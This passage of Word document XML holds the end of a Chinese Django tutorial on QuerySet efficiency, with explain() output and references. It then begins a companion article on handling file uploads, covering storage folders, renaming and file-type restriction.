        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>print(Blog.objects.filter(title='My Blog').explain(verbose=True))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC87E70" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BAF3148" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># output</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47373E00" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Seq Scan on public.blog  (cost=0.00..35.50 rows=10 width=12) (actual time=0.004..0.004 rows=10 loops=1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A8FDFA9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  Output: id, title</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44585532" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  Filter: (blog.title = 'My Blog'::bpchar)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41D06AB5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Planning time: 0.064 ms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3685D3E9" w14:textId="0BC93A5B" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidDel="001B46D3" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:del w:id="754" w:author="ABM ABM" w:date="2020-10-05T00:04:00Z"/>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Execution time: 0.058 ms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="471F4FAF" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1740D5B4" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>小结</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="655EF9CB" w14:textId="0EFC5741" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django QuerySet的惰性和缓存特性对于减少数据库的访问次数非常有用。你需要根据不同应用场景选择合适的方法(比如exists, count, update, values) 来减少数据库的访问，减少查询结果占用的内存空间从而提升网站的性能。希望本文总结的一些高效使用queryset技巧对你学习Django和Web开发有所帮助。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07A1D50A" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>参考</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66769083" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>http://blog.etianen.com/blog/2013/06/08/django-querysets/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33F7A81C" w14:textId="7494E404" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>https://docs.djangoproject.com/en/2.1/ref/models/querysets/#django.db.models.query.QuerySet.values</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF8F67D" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>大江狗</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A76B68A" w14:textId="1D5A4AE6" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2018.8.11</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F3F0E5E"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8" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django基础(14): 通过next参数实现登录后跳转回到前一页的3种方法</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2116EACA"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69" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django基础(15): 模板过滤器(filter)的工作原理及如何自定义模板过滤器</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="073A1B88"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70" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF">
          <w:rPr>
            <w:rStyle w:val="ab"/>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:color w:val="6795B5"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Django基础(16): 模板标签(tags)的分类及如何自定义模板标签</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5B3EE335" w14:textId="144C5132" w:rsidR="001C47AF" w:rsidRDefault="00230D30" w:rsidP="00230D30">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040</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:hyperlink r:id="rId271" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="00230D30">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:b/>
            <w:color w:val="4D4D4D"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="27"/>
            <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
          </w:rPr>
          <w:t>Django基础(17): 如何上传处理文件及Ajax文件上传示范(附GitHub源码)</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="533DDD25"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Django基础(17): 如何上传处理文件及Ajax文件上传示范(附GitHub源码)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0759BC5F" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>原创 大江狗 </w:t>
      </w:r>
      <w:hyperlink r:id="rId272" w:history="1">
        <w:r w:rsidRPr="00230D30">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Python Web与Django开发</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 2018-10-21</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="189C3984" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>来自专辑</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C574EDA"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Django基础连载</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C78C920" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>小编我今天要写篇值得大家收藏的文章。我将重点解释Django上传处理文件中需要考虑的重要事项，并提供一般文件上传及Ajax文件上传的示范(附GitHub源码)。如果你的项目需要用到文件上传，你可以从GitHub获取源代码，简化你的开发。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F685025" w14:textId="6348A2A8" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="613BF282" w14:textId="52DE8784" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django文件上传需要考虑的重要事项</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ADD18E5" w14:textId="3E51BFE8" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F10F1A4" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>文件一般通过表单进行。用户在前端点击文件上传，然后以POST方式将数据和文件提交到服务器。服务器在接收到POST请求后需要将其存储在服务器上的某个地方。Django默认的存储地址是相对于根目录的/media/文件夹，存储的默认文件名就是文件本来的名字。上传的文件如果不大于2.5MB，会先存入服务器内存中，然后再写入磁盘。如果上传的文件很大，Django会把文件先存入临时文件，再写入磁盘。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7813025B" w14:textId="53D34D27" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C4E5EEA" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django默认处理方式会出现一个问题，所有文件都存储在一个文件夹里。不同用户上传的有相同名字的文件可能会相互覆盖。另外用户还可能上传一些不安全的文件如js和exe文件，我们必需对允许上传文件的类型进行限制。因此我们在利用Django处理文件上传时必需考虑如下3个因素:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="359BE23E" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>设置存储上传文件的文件夹地址</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="384336F2" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>对上传文件进行重命名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="059FB444" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>对可接受的文件类型进行限制(表单验证)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD339B7" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>本文将会讲解在Django示范代码中如何实现上述3个功能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="745A1757" w14:textId="7AA561AA" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F3E5A18" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django文件上传的3种常见方式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56131D5D" w14:textId="6EEBABE4" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="365A600A" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django文件上传一般有3种方式(如下所示)。我们会针对3种方式分别提供代码示范。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44231EA6" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用一般的表单上传，在视图中手动编写代码处理上传的文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="125B96EE" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>使用由模型创建的表单(ModelForm)上传，使用form.save()方法自动存储</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EB9ED05" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用Ajax实现文件异步上传，上传页面无需刷新即可显示新上传的文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DC6BA60" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BE8BB61" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>项目创建与设置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A697584" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们先使用django-admin startproject命令创建一个叫file_project的项目，然后cd进入file_project, 使用python manage.py startapp创建一个叫file_upload的app。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ACE3DC5" w14:textId="2356D80A" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="752468DC" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们首先需要将file_upload这个app加入到我们项目里，然后设置/media/和/STATIC_URL/文件夹。我们上传的文件都会放在/media/文件夹里。我们还需要使用css和js这些静态文件，所以需要设置STATIC_URL。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10D7A5E7" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#file_project/settings.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E16646A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
